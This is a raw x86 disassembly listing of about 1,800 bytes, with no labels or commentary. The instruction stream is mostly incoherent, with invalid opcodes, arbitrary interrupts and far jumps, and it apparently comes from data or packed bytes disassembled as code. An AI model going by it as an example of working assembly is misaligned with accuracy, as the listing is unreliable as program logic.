  422b6e:	pushf  
  422b6f:	stos   BYTE PTR es:[edi],al
  422b70:	sahf   
  422b71:	popa   
  422b72:	mov    esp,0xc180804a
  422b77:	mov    BYTE PTR [edi+0x649a62d9],al
  422b7d:	mov    ecx,edx
  422b7f:	rol    DWORD PTR [edx+0x70878492],cl
  422b85:	int    0xc6
  422b87:	or     eax,0x808169bd
  422b8c:	adc    dh,0x14
  422b8f:	int    0x76
  422b91:	mov    ebp,0xd30de6cd
  422b96:	lods   eax,DWORD PTR ds:[esi]
  422b97:	xchg   DWORD PTR [ebx],esi
  422b99:	retf   
  422b9a:	ror    BYTE PTR [eax+0x7ae4cfa8],0x84
  422ba1:	in     al,dx
  422ba2:	push   esi
  422ba3:	int    0xc6
  422ba5:	or     eax,0xbd92c704
  422baa:	daa    
  422bab:	add    DWORD PTR [eax-0x32e32980],0xe6cdbd76
  422bb5:	or     eax,0xc087add3
  422bba:	mov    BYTE PTR [esi-0x30577740],bl
  422bc0:	gs jp  0x422b47
  422bc3:	add    DWORD PTR [eax-0x3ccf1380],0x80809284
  422bcd:	xchg   esi,esp
  422bcf:	or     eax,0x699e30c0
  422bd4:	add    BYTE PTR [ecx-0x72f57f80],0xb5
  422bdb:	xor    ebp,DWORD PTR [ebp+0x6c]
  422bde:	int    0x10
  422be0:	mov    ebp,0x808081bc
  422be5:	int    0x7d
  422be7:	xor    ecx,DWORD PTR [edi]
  422be9:	xor    ah,0x81
  422bec:	lea    esi,[ebp-0x7b8a19fc]
  422bf2:	das    
  422bf3:	add    al,0xd0
  422bf5:	add    BYTE PTR [eax+0x75760480],0x8b
  422bfc:	int    0x8d
  422bfe:	mov    ch,0x4
  422c00:	cli    
  422c01:	test   BYTE PTR [edx-0x61783f79],al
  422c07:	int    0xe6
  422c09:	jge    0x422bde
  422c0b:	xacquire xchg BYTE PTR [ebx],dh
  422c0e:	ins    DWORD PTR es:[edi],dx
  422c0f:	ins    BYTE PTR es:[edi],dx
  422c10:	shr    BYTE PTR [eax+ebp*4-0x31],0x65
  422c15:	outs   dx,DWORD PTR ds:[esi]
  422c16:	lods   al,BYTE PTR ds:[esi]
  422c17:	xchg   DWORD PTR [eax-0x42ef3280],eax
  422c1d:	inc    esp
  422c1e:	add    DWORD PTR [eax+0x337dcd80],0xaf4820f
  422c28:	lea    edi,[ebp+0x4a58d0a]
  422c2e:	cli    
  422c2f:	test   BYTE PTR [edx+0x402cd77],al
  422c35:	mov    dh,0xa5
  422c37:	and    ebx,0xa58d04ef
  422c3d:	xchg   edx,eax
  422c3e:	mov    es,WORD PTR [edx+edi*8]
  422c41:	dec    esi
  422c42:	ja     0x422c62
  422c44:	pop    ebp
  422c45:	rcl    DWORD PTR [edx-0x2ccc7f80],1
  422c4b:	int    0xf
  422c4d:	fidiv  DWORD PTR [esi-0x5a89785b]
  422c53:	jecxz  0x422c02
  422c55:	xchg   DWORD PTR [esi+0x7d],esi
  422c58:	or     dh,BYTE PTR [esi+0xd]
  422c5b:	in     al,dx
  422c5c:	inc    esi
  422c5d:	add    al,0xef
  422c5f:	test   BYTE PTR [ebp-0x7f7f7fc9],bh
  422c65:	jecxz  0x422c53
  422c67:	jecxz  0x422c1f
  422c69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c6a:	pop    esi
  422c6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c6c:	lods   eax,DWORD PTR ds:[esi]
  422c6d:	add    BYTE PTR [esi+0x3ea57600],0xa6
  422c74:	lods   eax,DWORD PTR ds:[esi]
  422c75:	mov    ss,esi
  422c77:	mov    ebp,0x8086745d
  422c7c:	add    BYTE PTR [edi+0x760a7d76],0xd
  422c83:	shl    DWORD PTR [esi-0x7b3f7b5b],cl
  422c89:	test   al,0x33
  422c8b:	add    BYTE PTR [edx-0x33],bh
  422c8e:	leave  
  422c8f:	int    0xc6
  422c91:	or     eax,0x808059bd
  422c96:	cmp    BYTE PTR ds:0x8987d481,0xe6
  422c9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c9e:	jecxz  0x422c89
  422ca0:	mov    ss,esi
  422ca2:	in     eax,dx
  422ca3:	in     al,dx
  422ca4:	add    BYTE PTR [eax],0x76
  422ca7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ca8:	int    0x8d
  422caa:	mov    ch,0x4
  422cac:	rcl    DWORD PTR [edx-0x32021933],cl
  422cb2:	leave  
  422cb3:	xor    esi,DWORD PTR [esi+0x34]
  422cb6:	pop    esi
  422cb7:	jbe    0x422c5e
  422cb9:	jnp    0x422c45
  422cbb:	int    0xf8
  422cbd:	xor    edx,esi
  422cbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cc0:	int    0x96
  422cc2:	cmp    al,0x45
  422cc4:	inc    ecx
  422cc5:	inc    ebx
  422cc6:	add    esi,DWORD PTR [edi-0x79]
  422cc9:	jle    0x422ca1
  422ccb:	clc    
  422ccc:	or     ah,dh
  422cce:	std    
  422ccf:	das    
  422cd0:	pop    ecx
  422cd1:	adc    DWORD PTR [ebx-0x1a],eax
  422cd4:	cmp    al,0x2f
  422cd6:	or     esp,DWORD PTR [edx-0x2]
  422cd9:	add    BYTE PTR [eax],al
  422cdb:	mov    ebp,0x80808040
  422ce0:	xor    ebp,DWORD PTR [ebp-0x31]
  422ce3:	les    esi,FWORD PTR [esp+eiz*2]
  422ce6:	int    0x96
  422ce8:	sub    al,0xcd
  422cea:	(bad)  
  422ceb:	stc    
  422cec:	xor    edx,esi
  422cee:	sbb    al,0xa
  422cf0:	inc    edx
  422cf1:	int    0x96
  422cf3:	inc    esp
  422cf4:	int    0xe6
  422cf6:	std    
  422cf7:	xor    esp,esi
  422cf9:	xor    al,0xa
  422cfb:	pusha  
  422cfc:	retf   
  422cfd:	arpl   WORD PTR [eax-0x7fdb2d56],bp
  422d03:	test   al,0x9c
  422d05:	xor    ebp,DWORD PTR [ebp+0x6c]
  422d08:	in     al,dx
  422d09:	popf   
  422d0a:	adc    bh,ah
  422d0c:	add    BYTE PTR [eax-0x7e7d7e80],0xc5
  422d13:	shl    ebp,cl
  422d15:	mov    BYTE PTR [eax+0x43f9d6cd],bl
  422d1b:	(bad)  
  422d1c:	and    al,0x77
  422d1e:	mov    ch,0xcd
  422d20:	jbe    0x422ccf
  422d22:	shr    DWORD PTR [ebp+0x760a4588],cl
  422d28:	lods   eax,DWORD PTR ds:[esi]
  422d29:	or     dl,dh
  422d2b:	stc    
  422d2c:	test   al,0xc5
  422d2e:	int    0x8d
  422d30:	jne    0x422d61
  422d32:	pop    ecx
  422d33:	ins    DWORD PTR es:[edi],dx
  422d34:	shl    edx,cl
  422d36:	test   BYTE PTR [edi-0x2c78428a],al
  422d3c:	in     al,dx
  422d3d:	xchg   BYTE PTR [edi],ch
  422d3f:	pop    ecx
  422d40:	ins    DWORD PTR es:[edi],dx
  422d41:	xchg   DWORD PTR [esi+0x75],esi
  422d44:	int    0xc6
  422d46:	jge    0x422d17
  422d48:	les    esi,FWORD PTR [esi-0x80]
  422d4b:	xor    ebp,DWORD PTR [ebp-0x31]
  422d4e:	les    esi,FWORD PTR [esi-0x80]
  422d51:	adc    bh,ah
  422d53:	add    BYTE PTR [eax+0x24778180],0xcd
  422d5a:	mov    WORD PTR [esp+ebx*2],?
  422d5d:	shl    DWORD PTR [esp+esi*1-0x73bc77d4],cl
  422d64:	xor    al,0xa4
  422d66:	ja     0x422d8d
  422d68:	retf   0x31
  422d6b:	je     0x422da1
  422d6d:	pop    esp
  422d6e:	shl    ebp,cl
  422d70:	mov    BYTE PTR [ecx],cl
  422d72:	xchg   esp,eax
  422d73:	xor    al,0x2c
  422d75:	int    0xc
  422d77:	das    
  422d78:	mov    ebx,0xebd38096
  422d7d:	push   ebx
  422d7e:	das    
  422d7f:	rcl    DWORD PTR [ebx],1
  422d81:	pop    esi
  422d82:	mov    WORD PTR [esp+ebp*1],?
  422d85:	ja     0x422da1
  422d87:	int    0xdb
  422d89:	pop    edi
  422d8a:	or     BYTE PTR [eax+0x13338080],0xd3
  422d91:	jmp    0x422d18
  422d93:	mov    eax,0x87808d81
  422d98:	ins    DWORD PTR es:[edi],dx
  422d99:	iret   
  422d9a:	les    esi,FWORD PTR [esp+ebp*2]
  422d9d:	(bad)
  422da0:	test   DWORD PTR [esi],edi
  422da2:	mov    WORD PTR [esp+ebp*1],?
  422da5:	xor    ebx,ebx
  422da7:	mov    eax,0x8780963e
  422dac:	ins    DWORD PTR es:[edi],dx
  422dad:	add    al,0x6d
  422daf:	or     edi,0xc56c34c4
  422db5:	cwde   
  422db6:	int    0xf0
  422db8:	mov    ebp,0xfcd9
  422dbd:	int    0xd9
  422dbf:	int    0xf
  422dc1:	jns    0x422d49
  422dc3:	mov    bh,0xbd
  422dc5:	sub    esp,edi
  422dc7:	add    BYTE PTR [eax],al
  422dc9:	cwde   
  422dca:	int    0xf0
  422dcc:	jns    0x422e46
  422dce:	test   DWORD PTR [ebx+0xfc6bbd],esp
  422dd4:	add    BYTE PTR [eax-0x58798787],bl
  422dda:	mov    ebp,0xfc38
  422ddf:	jns    0x422e59
  422de1:	xchg   edx,eax
  422de2:	cmp    eax,0xeceb99cd
  422de7:	add    eax,DWORD PTR [eax]
  422de9:	add    BYTE PTR [esi-0x12ed1233],dl
  422def:	inc    esp
  422df0:	add    DWORD PTR [eax-0x6893680],0x35862149
  422dfa:	leave  
  422dfb:	jbe    0x422db2
  422dfd:	inc    ecx
  422dfe:	and    DWORD PTR [esi-0x778932cb],eax
  422e04:	or     dh,BYTE PTR [esi-0x78]
  422e07:	int    0x76
  422e09:	stc    
  422e0a:	int    0x96
  422e0c:	stc    
  422e0d:	pop    ebx
  422e0e:	cwde   
  422e0f:	call   0xd3e3:0x3b9effc0
  422e16:	jmp    0x3586:0x21d1bf28
  422e1d:	cmp    eax,ebp
  422e1f:	sar    DWORD PTR [ebp+0xad25392],cl
  422e25:	jbe    0x422e9c
  422e27:	int    0x76
  422e29:	stc    
  422e2a:	int    0x96
  422e2c:	stc    
  422e2d:	cmp    eax,ebp
  422e2f:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e35:	jmp    0xfd76:0xad25328
  422e3c:	int    0x76
  422e3e:	stc    
  422e3f:	int    0x96
  422e41:	stc    
  422e42:	cmp    eax,ebp
  422e44:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e4a:	jmp    0xd076:0xad25328
  422e51:	int    0x76
  422e53:	stc    
  422e54:	int    0x96
  422e56:	stc    
  422e57:	cmp    eax,ebp
  422e59:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e5f:	jmp    0xbd76:0xad25328
  422e66:	leave  
  422e67:	jbe    0x422e96
  422e69:	dec    ecx
  422e6a:	and    DWORD PTR [ebp+esi*1+0x496576c9],eax
  422e71:	mov    al,ds:0x76c93586
  422e76:	and    eax,0x35862169
  422e7b:	sar    BYTE PTR [esp+ebx*4],0xa
  422e7f:	jbe    0x422e51
  422e81:	or     dh,BYTE PTR [esi-0x30]
  422e84:	sar    BYTE PTR [esp+ebx*4+0xad0760a],0x76
  422e8c:	ror    cl,1
  422e8e:	jbe    0x422e60
  422e90:	jo     0x422e12
  422e92:	add    BYTE PTR [eax+0x78d076c9],0x80
  422e99:	add    BYTE PTR [eax-0x32068933],0x96
  422ea0:	stc    
  422ea1:	cmp    eax,ebp
  422ea3:	cmp    esp,ebx
  422ea5:	sar    DWORD PTR [ebp+0x28ead392],cl
  422eab:	push   ebx
  422eac:	ror    BYTE PTR [edx],cl
  422eae:	jbe    0x422e80
  422eb0:	int    0x76
  422eb2:	stc    
  422eb3:	int    0x96
  422eb5:	stc    
  422eb6:	cmp    eax,ebp
  422eb8:	cmp    esp,ebx
  422eba:	sar    DWORD PTR [ebp+0x28ead392],cl
  422ec0:	push   ebx
  422ec1:	ror    BYTE PTR [edx],cl
  422ec3:	jbe    0x422e95
  422ec5:	leave  
  422ec6:	jbe    0x422e5d
  422ec8:	arpl   WORD PTR [edx+0x76c98080],dx
  422ece:	lods   eax,DWORD PTR ds:[esi]
  422ecf:	pop    esi
  422ed0:	add    BYTE PTR [eax+0xd76c980],0xe6
  422ed7:	add    BYTE PTR [eax-0xa983080],0xff
  422ede:	add    BYTE PTR [eax],al
  422ee0:	iret   
  422ee1:	push   edi
  422ee2:	xchg   ebp,eax
  422ee3:	inc    DWORD PTR [eax]
  422ee5:	add    BYTE PTR [ebp+0xff13],bh
  422eeb:	add    BYTE PTR [ebp+0xf3d60d],cl
  422ef1:	lea    ebp,[ebp-0x72ff562a]
  422ef7:	xchg   ebp,eax
  422ef8:	(bad)  
  422ef9:	fcmove st,st(1)
  422efb:	jbe    0x422eaa
  422efd:	dec    esi
  422efe:	ins    BYTE PTR es:[edi],dx
  422eff:	add    BYTE PTR [eax-0x32068933],0x8d
  422f06:	stc    
  422f07:	cmp    eax,ebp
  422f09:	sar    DWORD PTR [ebp-0x57003f6e],cl
  422f0f:	cmp    ecx,DWORD PTR [edi]
  422f11:	shl    edx,cl
  422f13:	sub    BYTE PTR [ebx-0x2d],dl
  422f16:	or     dh,BYTE PTR [esi+0x6d]
  422f19:	int    0x76
  422f1b:	stc    
  422f1c:	int    0x8d
  422f1e:	stc    
  422f1f:	add    al,0xb6
  422f21:	cmc    
  422f22:	cmp    BYTE PTR [ebx],0xc5
  422f25:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  422f2b:	repnz sub BYTE PTR [ebx-0x2d],dl
  422f2f:	or     dh,BYTE PTR [esi-0x6b]
  422f32:	mov    ah,0xb1
  422f34:	sbb    al,0x80
  422f36:	add    BYTE PTR [eax-0x320a89f6],0x6c
  422f3d:	push   eax
  422f3e:	or     dh,BYTE PTR [esi-0x13]
  422f41:	int    0x6c
  422f43:	dec    esp
  422f44:	or     dh,BYTE PTR [esi+0x11]
  422f47:	int    0x76
  422f49:	mov    bh,cl
  422f4b:	(bad)  
  422f4c:	cmc    
  422f4d:	or     cl,BYTE PTR [ecx]
  422f4f:	rol    BYTE PTR [ecx+0x76cd8080],1
  422f55:	mov    bh,cl
  422f57:	(bad)  
  422f58:	in     eax,dx
  422f59:	or     cl,BYTE PTR [ecx]
  422f5b:	push   ebp
  422f5c:	add    DWORD PTR [eax-0x77893280],0xcf88d600
  422f66:	lea    edx,[ecx]
  422f68:	or     cl,BYTE PTR [ecx]
  422f6a:	pop    ebp
  422f6b:	add    DWORD PTR [eax+0x3eccbd80],0x8dcd8080
  422f75:	stc    
  422f76:	int    0x96
  422f78:	stc    
  422f79:	cmp    ecx,DWORD PTR [ebx+edi*1]
  422f7c:	cdq    
  422f7d:	shr    ebx,cl
  422f7f:	xchg   edx,eax
  422f80:	shr    edx,cl
  422f82:	sub    BYTE PTR [ebx+0x13],dl
  422f85:	inc    ebx
  422f86:	jge    0x422fb7
  422f88:	add    eax,0x808087ca
  422f8d:	int    0x76
  422f8f:	mov    ch,cl
  422f91:	add    DWORD PTR ds:0xcd808081,esi
  422f97:	mov    ch,cl
  422f99:	jbe    0x422f23
  422f9b:	int    0x1
  422f9d:	xor    eax,0xcd808081
  422fa2:	add    BYTE PTR [edi-0x72329b92],0x88
  422fa9:	int    0xa
  422fab:	adc    DWORD PTR [ecx+0x17cf8080],eax
  422fb1:	adc    al,0x0
  422fb3:	add    BYTE PTR [eax],al
  422fb5:	(bad)  
  422fb6:	int    0x96
  422fb8:	mov    ch,cl
  422fba:	mov    ds:0x80808125,al
  422fbf:	int    0x22
  422fc1:	xchg   DWORD PTR [eax-0x7f7f7ff7],esi
  422fc7:	rol    BYTE PTR [eax+eax*1-0x7f7f3330],0x80
  422fcf:	bound  eax,QWORD PTR [eax]
  422fd1:	jno    0x422ff7
  422fd3:	cmp    ebp,DWORD PTR [ebp-0x37]
  422fd6:	push   es
  422fd7:	push   esp
  422fd8:	add    BYTE PTR [eax],al
  422fda:	add    BYTE PTR [esi],cl
  422fdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fdd:	aad    0x49
  422fdf:	leave  
  422fe0:	push   es
  422fe1:	pop    esp
  422fe2:	add    BYTE PTR [eax],al
  422fe4:	add    BYTE PTR [edi+0x35],dl
  422fe7:	adc    ebp,DWORD PTR [ebx+0x6406c9]
  422fed:	add    BYTE PTR [eax],al
  422fef:	mov    ds:0x79d735c1,eax
  422ff4:	push   es
  422ff5:	ins    BYTE PTR es:[edi],dx
  422ff6:	add    BYTE PTR [eax],al
  422ff8:	add    BYTE PTR [eax],bl
  422ffa:	iret   
  422ffb:	outs   dx,BYTE PTR ds:[si]
  422ffd:	add    BYTE PTR [eax],al
  422fff:	add    BYTE PTR [edi+0x3b41afb8],ch
  423005:	ins    DWORD PTR es:[edi],dx
  423006:	leave  
  423007:	push   es
  423008:	sub    al,0x0
  42300a:	add    BYTE PTR [eax],al
  42300c:	push   cs
  42300d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42300e:	aad    0x49
  423010:	leave  
  423011:	push   es
  423012:	xor    al,0x0
  423014:	add    BYTE PTR [eax],al
  423016:	push   edi
  423017:	xor    eax,0x6c9ab13
  42301c:	cmp    al,0x0
  42301e:	add    BYTE PTR [eax],al
  423020:	mov    ds:0x79c335c1,eax
  423025:	push   es
  423026:	inc    esp
  423027:	add    BYTE PTR [eax],al
  423029:	add    BYTE PTR [eax],bl
  42302b:	iret   
  42302c:	addr16 inc esi
  42302e:	add    BYTE PTR [eax],al
  423030:	add    BYTE PTR [edi-0x32be5048],ch
  423036:	jbe    0x422fc0
  423038:	int    0x1
  42303a:	adc    DWORD PTR [ecx-0x19327f80],eax
  423040:	mov    BYTE PTR [ebp*2+0x35760a30],al
  423047:	int    0x76
  423049:	mov    ch,cl
  42304b:	add    DWORD PTR [ebp-0x7f],edi
  42304e:	add    BYTE PTR [eax+0x410176c9],0xa7
  423055:	mov    dl,0x35
  423057:	leave  
  423058:	jbe    0x42305f
  42305a:	mov    bh,0x3f
  42305c:	cmp    DWORD PTR [edi-0x48],eax
  42305f:	leave  
  423060:	jbe    0x42306b
  423062:	xlat   BYTE PTR ds:[ebx]
  423063:	sbb    cl,cl
  423065:	push   es
  423066:	les    eax,FWORD PTR [eax]
  423068:	add    BYTE PTR [eax],al
  42306a:	push   cs
  42306b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42306c:	aad    0x49
  42306e:	leave  
  42306f:	push   es
  423070:	nop
  423071:	add    BYTE PTR [eax],al
  423073:	add    BYTE PTR [edi+0x35],dl
  423076:	xlat   BYTE PTR ds:[ebx]
  423077:	inc    ecx
  423078:	leave  
  423079:	push   es
  42307a:	aam    0x0
  42307c:	add    BYTE PTR [eax],al
  42307e:	cmp    DWORD PTR [ecx+0x57],ecx
  423081:	jge    0x42304c
  423083:	push   es
  423084:	fadd   QWORD PTR [eax]
  423086:	add    BYTE PTR [eax],al
  423088:	mov    cl,0x3f
  42308a:	shl    DWORD PTR ds:0xe406c9,0x0
  423091:	add    BYTE PTR [edi-0x49],al
  423094:	xlat   BYTE PTR ds:[ebx]
  423095:	sbb    cl,cl
  423097:	push   es
  423098:	pushf  
  423099:	add    BYTE PTR [eax],al
  42309b:	add    BYTE PTR [esi],cl
  42309d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42309e:	aad    0x49
  4230a0:	leave  
  4230a1:	push   es
  4230a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230a3:	add    BYTE PTR [eax],al
  4230a5:	add    BYTE PTR [edi+0x35],dl
  4230a8:	xlat   BYTE PTR ds:[ebx]
  4230a9:	inc    ecx
  4230aa:	leave  
  4230ab:	push   es
  4230ac:	lods   al,BYTE PTR ds:[esi]
  4230ad:	add    BYTE PTR [eax],al
  4230af:	add    BYTE PTR [ecx],bh
  4230b1:	dec    ecx
  4230b2:	push   edi
  4230b3:	jge    0x42307e
  4230b5:	push   es
  4230b6:	mov    ah,0x0
  4230b8:	add    BYTE PTR [eax],al
  4230ba:	mov    cl,0x3f
  4230bc:	shl    DWORD PTR ds:0xbc06c9,0x0
  4230c3:	add    BYTE PTR [edi-0x49],al
  4230c6:	ret    
  4230c7:	sbb    BYTE PTR [ebp-0x7f7fc39d],bh
  4230cd:	jo     0x42309c
  4230cf:	jbe    0x423106
  4230d1:	add    BYTE PTR [eax],dh
  4230d3:	int    0x76
  4230d5:	stc    
  4230d6:	int    0x8d
  4230d8:	stc    
  4230d9:	cmp    eax,ebp
  4230db:	cmp    ecx,DWORD PTR [edi]
  4230dd:	shl    edx,cl
  4230df:	sub    bl,dl
  4230e1:	mov    ebp,0xcdd35392
  4230e6:	lea    ebp,[ebp+0x52fd343]
  4230ec:	test   BYTE PTR [ecx+0x76cd8080],0xb5
  4230f3:	int    0x8d
  4230f5:	mov    ch,0x3b
  4230f7:	lds    edi,FWORD PTR [ebx]
  4230f9:	psrlq  mm6,mm2
  4230fc:	sub    bl,dl
  4230fe:	mov    ebp,0xcdd35392
  423103:	lea    ebp,[ebp+0x76cd7d33]
  423109:	ins    DWORD PTR es:[edi],dx
  42310a:	inc    ebx
  42310b:	shr    DWORD PTR [edi],cl
  42310d:	or     ch,dl
  42310f:	add    DWORD PTR [eax+0x3d76c980],0x80808080
  423119:	int    0x76
  42311b:	mov    ch,cl
  42311d:	rcl    BYTE PTR [ecx],1
  42311f:	add    DWORD PTR [eax-0x77193280],0xcd8876cd
  423129:	add    DWORD PTR [ebp-0x7f],esi
  42312c:	add    BYTE PTR [eax-0x7fc50943],0x80
  423133:	jo     0x423135
  423135:	cwde   
  423136:	xor    ch,cl
  423138:	lea    ecx,[eax-0x7ebaf533]
  42313e:	add    BYTE PTR [eax+0x76cd810a],0x88
  423145:	int    0x5d
  423147:	adc    DWORD PTR [ecx-0x29327f80],eax
  42314d:	mov    BYTE PTR [ebx],bh
  42314f:	ins    DWORD PTR es:[edi],dx
  423150:	iret   
  423151:	pop    ss
  423152:	pushf  
  423153:	add    BYTE PTR [eax],al
  423155:	add    BYTE PTR [ebp-0x7f7fc36e],bh
  42315b:	jo     0x42312a
  42315d:	jbe    0x4230e7
  42315f:	int    0x1
  423161:	inc    ebp
  423162:	add    DWORD PTR [eax+0x500080],0x760a889a
  42316c:	adc    eax,0xcd8876cd
  423171:	pop    ebp
  423172:	adc    DWORD PTR [ecx-0x29327f80],eax
  423178:	mov    BYTE PTR [ebx],bh
  42317a:	ins    DWORD PTR es:[edi],dx
  42317b:	iret   
  42317c:	pop    ss
  42317d:	les    eax,FWORD PTR [eax]
  42317f:	add    BYTE PTR [eax],al
  423181:	mov    ebp,0x80803ad9
  423186:	jo     0x423155
  423188:	jbe    0x423112
  42318a:	int    0x1
  42318c:	inc    ebp
  42318d:	add    DWORD PTR [eax+0x500080],0x76cd889a
  423197:	mov    ch,cl
  423199:	pop    ebp
  42319a:	adc    DWORD PTR [ecx-0x29327f80],eax
  4231a0:	mov    BYTE PTR [ebx],bh
  4231a2:	ins    DWORD PTR es:[edi],dx
  4231a3:	iret   
  4231a4:	pop    ss
  4231a5:	push   esp
  4231a6:	add    BYTE PTR [eax],al
  4231a8:	add    BYTE PTR [ebp-0x7f7fc52f],bh
  4231ae:	jo     0x42317d
  4231b0:	jbe    0x42313a
  4231b2:	int    0x1
  4231b4:	inc    ebp
  4231b5:	add    DWORD PTR [eax+0x500080],0xb604889a
  4231bf:	pop    ebp
  4231c0:	or     BYTE PTR [edx],0x76
  4231c3:	xor    eax,0xc05d76cd
  4231c8:	push   ds
  4231c9:	cmp    ebx,edx
  4231cb:	sahf   
  4231cc:	clc    
  4231cd:	add    al,BYTE PTR [ecx]
  4231cf:	shr    BYTE PTR [esi+0x2f],cl
  4231d2:	pop    ecx
  4231d3:	shl    BYTE PTR [eax+0x0],cl
  4231d6:	xchg   esi,eax
  4231d7:	xor    eax,0x43d66d06
  4231dc:	int    0x76
  4231de:	pop    ebp
  4231df:	add    al,0xad
  4231e1:	mov    eax,DWORD PTR [ebp*2-0x69ff8faf]
  4231e8:	adc    eax,0x40d46d06
  4231ed:	int    0x76
  4231ef:	mov    ch,cl
  4231f1:	pop    ebp
  4231f2:	adc    DWORD PTR [ecx-0x29327f80],eax
  4231f8:	mov    BYTE PTR [ebx],bh
  4231fa:	ins    DWORD PTR es:[edi],dx
  4231fb:	iret   
  4231fc:	xchg   esi,eax
  4231fd:	add    DWORD PTR [ebp-0x7f7fc560],edi
  423203:	jo     0x4231d2
  423205:	jbe    0x42318f
  423207:	int    0x1
  423209:	cmp    eax,0x808081
  42320e:	push   eax
  42320f:	add    BYTE PTR [edx+0xd760a88],bl
  423215:	in     al,dx
  423216:	test   BYTE PTR [esi+esi*4],al
  423219:	or     eax,0x5d760080
  42321e:	add    al,0xe6
  423220:	pop    ebp
  423221:	sub    al,0x82
  423223:	sub    eax,0xcdb576cd
  423228:	lea    esi,[ebp-0x3f772933]
  42322e:	jmp    FWORD PTR [edx-0xfc43ac5]
  423234:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42323a:	push   ebx
  42323b:	ror    edi,cl
  42323d:	pop    ss
  42323e:	cmc    
  42323f:	inc    DWORD PTR [eax]
  423241:	add    BYTE PTR [ebp-0x7f7fc5e8],bh
  423247:	jo     0x423216
  423249:	jbe    0x423244
  42324b:	int    0x8d
  42324d:	stc    
  42324e:	int    0xd6
  423250:	mov    BYTE PTR [ebx],bh
  423252:	lds    edi,FWORD PTR [ebx]
  423254:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42325b:	push   ebx
  42325c:	ror    edi,cl
  42325e:	pop    ss
  42325f:	xchg   ebp,eax
  423260:	inc    DWORD PTR [eax]
  423262:	add    BYTE PTR [ebp-0x7f7fc70a],bh
  423268:	jo     0x42326a
  42326a:	xchg   esi,eax
  42326b:	or     eax,0xcdf98dcd
  423270:	xchg   esi,eax
  423271:	stc    
  423272:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423275:	(bad)  
  423277:	jmp    0x42320b
  423279:	shr    edx,cl
  42327b:	sub    BYTE PTR [ebx+0x13],dl
  42327e:	inc    ebx
  42327f:	jge    0x423257
  423281:	mov    ecx,ecx
  423283:	jbe    0x4232c2
  423285:	add    DWORD PTR [eax+0x76cd8080],0xb58dcdb5
  42328f:	cmp    eax,ebp
  423291:	sar    DWORD PTR [ebp-0x2c0fc46e],cl
  423297:	repnz sub BYTE PTR [ebx-0x2d],dl
  42329b:	xchg   DWORD PTR [esi+0x6d],esi
  42329e:	or     dh,BYTE PTR [esi+0x6d]
  4232a1:	int    0x76
  4232a3:	cmp    eax,0x1cd46d06
  4232a8:	int    0x76
  4232aa:	mov    ch,0xcd
  4232ac:	lea    esi,[ebp-0xfc43ac5]
  4232b2:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4232b8:	push   ebx
  4232b9:	rol    DWORD PTR [edi+0x760a9576],cl
  4232bf:	xchg   ebp,eax
  4232c0:	int    0x76
  4232c2:	mov    ch,0xcd
  4232c4:	lea    esi,[ebp-0xfc43ac5]
  4232ca:	shl    edx,cl
  4232cc:	sub    bl,dl
  4232ce:	mov    ebp,0xcdd35392
  4232d3:	lea    ebp,[ebp+0x76cd7d33]
  4232d9:	ins    DWORD PTR es:[edi],dx
  4232da:	inc    ebx
  4232db:	shr    DWORD PTR [edi],cl
  4232dd:	pop    es
  4232de:	push   eax
  4232df:	inc    DWORD PTR [eax]
  4232e1:	add    al,al
  4232e3:	jmp    FWORD PTR [eax-0x326a8933]
  4232e9:	lea    ebp,[ebp+0x43]
  4232ec:	jge    0x4232c4
  4232ee:	xor    DWORD PTR [eax],eax
  4232f0:	(bad)  
  4232f1:	mov    bh,cl
  4232f3:	jbe    0x4232f2
  4232f5:	jo     0x4232b4
  4232f7:	stc    
  4232f8:	jl     0x42327a
  4232fa:	or     BYTE PTR [edx],0x76
  4232fd:	jne    0x4232eb
  4232ff:	sbb    cl,ch
  423301:	jbe    0x423378
  423303:	int    0x8d
  423305:	mov    ch,0xcd
  423307:	xchg   esi,eax
  423308:	mov    ch,0x3b
  42330a:	or     al,0x3b
  42330c:	cdq    
  42330d:	shr    ebx,cl
  42330f:	xchg   edx,eax
  423310:	shr    edx,cl
  423312:	sub    BYTE PTR [ebx+0x13],dl
  423315:	push   ecx
  423316:	mov    ch,cl
  423318:	jbe    0x423313
  42331a:	int    0x8d
  42331c:	stc    
  42331d:	cmp    eax,ebp
  42331f:	cmp    ecx,DWORD PTR [edi]
  423321:	shl    edx,cl
  423323:	sub    bl,dl
  423325:	mov    ebp,0xcdd35392
  42332a:	lea    esi,[ebp+0x43]
  42332d:	shr    DWORD PTR [edi],cl
  42332f:	add    eax,0x80805300
  423334:	int    0x76
  423336:	stc    
  423337:	int    0x8d
  423339:	stc    
  42333a:	cmp    eax,ebp
  42333c:	cmp    ecx,DWORD PTR [edi]
  42333e:	shl    edx,cl
  423340:	sub    bl,dl
  423342:	mov    ebp,0xcdd35392
  423347:	(bad)  
  423348:	std    
  423349:	inc    ebx
  42334a:	shr    DWORD PTR [edi],cl
  42334c:	add    eax,0x808053ea
  423351:	int    0x76
  423353:	stc    
  423354:	int    0x8d
  423356:	stc    
  423357:	cmp    eax,ebp
  423359:	cmp    ecx,DWORD PTR [edi]
  42335b:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423361:	push   ebx
  423362:	shr    esp,cl
  423364:	adc    al,0xcd
  423366:	lea    esi,[ebp+0x3bb596cd]
  42336c:	or     al,0x3b
  42336e:	cdq    
  42336f:	shr    ebx,cl
  423371:	xchg   edx,eax
  423372:	shr    edx,cl
  423374:	sub    BYTE PTR [ebx+0x13],dl
  423377:	xchg   ebx,edx
  423379:	int    0x8d
  42337b:	std    
